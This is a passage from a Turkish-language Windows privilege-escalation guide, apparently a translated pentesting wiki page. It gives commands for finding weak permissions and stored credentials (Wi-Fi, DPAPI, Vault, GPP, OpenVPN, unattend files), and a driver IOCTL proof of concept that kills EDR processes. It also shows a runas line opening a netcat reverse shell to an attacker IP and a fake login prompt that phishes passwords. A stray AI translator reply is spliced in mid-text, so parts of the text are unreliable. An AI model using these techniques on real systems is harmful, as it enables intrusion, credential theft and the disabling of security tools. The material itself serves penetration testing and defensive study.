Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı özel dosyaları okumak için bazı config dosyalarını değiştirip değiştiremeyeceğinizi veya Administrator hesabı tarafından çalıştırılacak bir binary'i (schedtasks) değiştirip değiştiremeyeceğinizi kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload kalıcılık/çalıştırma

Notepad++ her `plugins` alt klasöründeki plugin DLL'lerini otomatik yükler. Yazılabilir bir portable/kopya kurulum mevcutsa, zararlı bir plugin bırakmak `notepad++.exe` içinde her başlatmada otomatik kod çalıştırmaya yol açar (DllMain ve plugin callbacks dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Başka bir kullanıcı tarafından çalıştırılacak bazı registry veya binary'lerin üzerine yazıp yazamayacağınızı kontrol edin.**\
**Aşağıdaki sayfayı** okuyarak izin yükseltmek için ilginç **autoruns** konumları hakkında daha fazla bilgi edinebilirsiniz:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Potansiyel **third party weird/vulnerable** sürücülere bakın
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Eğer bir driver arbitrary kernel read/write primitive açığa çıkarıyorsa (zayıf tasarlanmış IOCTL handler'larında yaygındır), doğrudan kernel belleğinden bir SYSTEM token çalarak ayrıcalıkları yükseltebilirsiniz. Adım adım teknik için bakınız:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Vulnerable call'ın attacker-controlled Object Manager path açtığı race-condition hatalarında, lookup'ı bilerek yavaşlatmak (max-length components veya derin dizin zincirleri kullanarak) pencereyi mikrosaniyelerden onlarca mikrosaniyeye kadar uzatabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities, deterministik layout'ları hazırlamanıza, yazılabilir HKLM/HKU alt dallarını kötüye kullanmanıza ve metadata bozulmasını custom driver olmaksızın kernel paged-pool overflow'larına dönüştürmenize imkan verir. Tam zincir için bakınız:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver'lar device object'larını güçlü bir SDDL ile IoCreateDeviceSecure üzerinden oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN'u ayarlamayı unutur. Bu flag olmadan, secure DACL ekstra bir bileşen içeren bir yol üzerinden device açıldığında uygulanmaz; bu da herhangi bir ayrıcalıksız kullanıcının şu gibi bir namespace path kullanarak bir handle elde etmesine izin verir:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (from a real-world case)

Kullanıcı device'ı açabildiğinde, driver tarafından açığa çıkarılan ayrıcalıklı IOCTL'lar LPE ve manipülasyon için kötüye kullanılabilir. Vahşi doğada gözlemlenen örnek yetenekler:
- İstediğiniz process'e tam erişimli handle döndürebilme (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Sınırsız raw disk read/write (offline tampering, boot-time persistence tricks).
- Protected Process/Light (PP/PPL) dahil olmak üzere istediğiniz process'leri sonlandırma; böylece user land'den kernel aracılığıyla AV/EDR kill yapılabilmesi.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için önlemler
- DACL ile kısıtlanması amaçlanan device objects oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için çağıran bağlamını doğrulayın. İşlem sonlandırmaya veya handle dönüşlerine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTLs'i (access masks, METHOD_*, input validation) sınırlayın ve doğrudan kernel ayrıcalıkları yerine brokered modelleri düşünün.

Savunucular için tespit fikirleri
- Şüpheli aygıt isimlerinin kullanıcı modu açılışlarını (ör. \\ .\\amsdk*) ve kötüye kullanımın göstergesi olan belirli IOCTL dizilerini izleyin.
- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi izin/red listelerinizi koruyun.

## PATH DLL Hijacking

If you have **PATH içinde bulunan bir klasörde yazma izinlerine sahipseniz** bir işlem tarafından yüklenen bir DLL'i ele geçirip **yetki yükseltme** yapabilirsiniz.

PATH içindeki tüm klasörlerin izinlerini kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu kontrolün nasıl kötüye kullanılacağı hakkında daha fazla bilgi için:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Ağ

### Paylaşımlar
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file içinde sert kodlanmış diğer bilinen bilgisayarları kontrol edin.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **kısıtlı servisleri** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Kuralları

[**Firewall ile ilgili komutlar için bu sayfayı kontrol edin**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listele, kurallar oluştur, kapat, kapat...)**

Daha fazla[ network enumeration için komutlar burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
İkili `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` içinde bulunabilir

Eğer root user olursanız herhangi bir portta dinleyebilirsiniz (bir portu dinlemek için ilk kez `nc.exe`'yi kullandığınızda, GUI aracılığıyla `nc`'nin firewall tarafından izin verilip verilmeyeceğini soracaktır).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash'i root olarak kolayca başlatmak için `--default-user root` deneyebilirsiniz

WSL dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Kimlik bilgileri yöneticisi / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault, **Windows**'ın kullanıcıları otomatik olarak oturum açtırabildiği sunucular, web siteleri ve diğer programlar için kullanıcı kimlik bilgilerini depolar. İlk bakışta, kullanıcıların Facebook kimlik bilgilerini, Twitter kimlik bilgilerini, Gmail kimlik bilgilerini vb. saklayıp tarayıcılar aracılığıyla otomatik giriş yapabildikleri izlenimi verebilir. Ancak durum böyle değildir.

Windows Vault, Windows'ın kullanıcıları otomatik olarak oturum açtırabildiği kimlik bilgilerini depolar; bu da herhangi bir **kaynağa (sunucu veya bir web sitesi) erişmek için kimlik bilgisini gerektiren Windows uygulamasının** bu Credential Manager'ı ve Windows Vault'u **kullanabileceği** ve kullanıcıların sürekli kullanıcı adı ve parola girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmezse, belirli bir kaynak için kimlik bilgilerini kullanmalarının mümkün olduğunu düşünmüyorum. Bu yüzden, uygulamanız vault'dan yararlanmak istiyorsa, varsayılan depolama vault'undan o kaynak için kimlik bilgilerini istemek üzere bir şekilde **credential manager ile iletişim kurmalı ve o kaynağın kimlik bilgilerini talep etmelidir**.

Makinadaki depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Daha sonra kaydedilmiş kimlik bilgilerini kullanmak için `runas`'ı `/savecred` seçeneğiyle kullanabilirsiniz. Aşağıdaki örnek bir uzak binary'yi SMB share üzerinden çağırıyor.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Sağlanan credential seti ile `runas` kullanımı.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Not: mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) kullanılabilir.

### DPAPI

The **Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar; özellikle Windows işletim sisteminde, asimetrik özel anahtarların simetrik şifrelenmesi için kullanılır. Bu şifreleme, entropiye önemli katkı sağlayan bir kullanıcı veya sistem sırrını kullanır.

**DPAPI, kullanıcı oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesine olanak tanır**. Sistem şifrelemesi senaryolarında ise sistemin domain kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenmiş kullanıcı RSA anahtarları %APPDATA%\Microsoft\Protect\{SID} dizininde saklanır; burada {SID} kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)'ını temsil eder. **DPAPI anahtarı, kullanıcının özel anahtarlarını koruyan master anahtar ile aynı dosyada birlikte bulunur**, ve genellikle 64 bayt rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu; CMD'de dir komutu ile içeriğinin listelenmesinin engellendiğini, ancak PowerShell ile listelenebildiğini unutmamak önemlidir.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
**mimikatz module** `dpapi::masterkey`'i uygun argümanlarla (`/pvk` veya `/rpc`) kullanarak şifreyi çözebilirsiniz.

**credentials files protected by the master password** genellikle şu konumda bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
Root iseniz `sekurlsa::dpapi` modülü ile birçok **DPAPI** **masterkeys**'i **memory**'den extract edebilirsiniz.


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Kimlik Bilgileri

**PowerShell credentials** genellikle şifrelenmiş kimlik bilgilerini pratik şekilde saklamak için **scripting** ve otomasyon görevlerinde kullanılır. Bu kimlik bilgileri **DPAPI** ile korunur; bu da genellikle oluşturuldukları aynı bilgisayarda aynı kullanıcı tarafından çözülebilecekleri anlamına gelir.

İçinde bulunduğu dosyadan bir PS credentials'ı **decrypt** etmek için şunu yapabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Onları şurada bulabilirsiniz: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Son Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgileri Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Uygun `/masterkey` ile **Mimikatz** `dpapi::rdg` modülünü kullanarak herhangi bir .rdg dosyasını **şifre çözün**.\
Mimikatz `sekurlsa::dpapi` modülü ile bellekten birçok **DPAPI masterkeys** çıkarabilirsiniz.

### Sticky Notes

İnsanlar genellikle Windows iş istasyonlarında StickyNotes uygulamasını bir veritabanı dosyası olduğunu fark etmeden **parolaları kaydetmek** ve diğer bilgileri saklamak için kullanırlar. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve mutlaka aranıp incelenmelidir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity seviyesinde çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Eğer bu dosya mevcutsa bazı **credentials** yapılandırılmış olabilir ve **kurtarılabilir**.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)'tan alınmıştır:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının varlığını kontrol edin .\
Yükleyiciler **run with SYSTEM privileges**, birçoğu **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Kayıt Defteri (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Kayıt defterindeki SSH anahtarları

SSH özel anahtarları `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarı içinde saklanabilir, bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Eğer bu yoldaki herhangi bir giriş bulursanız, muhtemelen kaydedilmiş bir SSH key’idir. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca deşifre edilebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Eğer `ssh-agent` servisi çalışmıyorsa ve sistem açılışında otomatik başlamasını istiyorsanız çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Bazı ssh anahtarları oluşturmayı, bunları `ssh-add` ile eklemeyi ve bir makineye ssh ile giriş yapmayı denedim. Kayıt defteri HKCU\Software\OpenSSH\Agent\Keys mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Bulut Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya arayın

### Önbelleğe Alınmış GPP Parolası

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir grup makinede özel local administrator hesaplarının dağıtımına izin veren bir özellik mevcuttu. Ancak bu yöntemin önemli güvenlik açıkları vardı. Birincisi, SYSVOL içinde XML dosyaları olarak saklanan Group Policy Objects (GPOs) herhangi bir domain kullanıcısı tarafından erişilebiliyordu. İkincisi, bu GPP'lerdeki parolalar, halka açık belgelenmiş bir varsayılan anahtar kullanılarak AES256 ile şifrelenmişti ve herhangi bir kimlik doğrulanmış kullanıcı tarafından çözülebiliyordu. Bu durum, kullanıcıların ayrıcalık yükseltmesine yol açabilecek ciddi bir risk teşkil ediyordu.

Bu riski azaltmak için, boş olmayan bir "cpassword" alanı içeren yerel olarak önbelleğe alınmış GPP dosyalarını tarayan bir fonksiyon geliştirildi. Böyle bir dosya bulunduğunda fonksiyon parolayı çözüyor ve özel bir PowerShell objesi döndürüyor. Bu obje, GPP ile ilgili detayları ve dosyanın konumunu içererek bu güvenlik açığının tespitine ve giderilmesine yardımcı oluyor.

Aşağıdaki dizinlerde bu dosyaları arayın: `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista'dan önce)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'i çözmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec kullanarak passwords elde etme:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Kimlik bilgileri içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Kayıtlar
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Kimlik bilgilerini isteyin

Eğer kullanıcının bunları bilebileceğini düşünüyorsanız, her zaman **kullanıcıdan kendi kimlik bilgilerini veya hatta başka bir kullanıcının kimlik bilgilerini girmesini isteyebilirsiniz** (doğrudan istemciden **kimlik bilgilerini** **istemek** gerçekten **risklidir**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Kimlik bilgileri içerebilecek olası dosya adları**

Bir süre önce **passwords**'ı **clear-text** veya **Base64** halinde içeren bilinen dosyalar
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Şu anda dosyalara doğrudan erişimim yok. Lütfen çevirmemi istediğiniz README.md veya diğer dosyaların içeriklerini buraya yapıştırın veya dosya listesini paylaşın; ardından ilgili İngilizce metni Türkçeye çevireyim.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
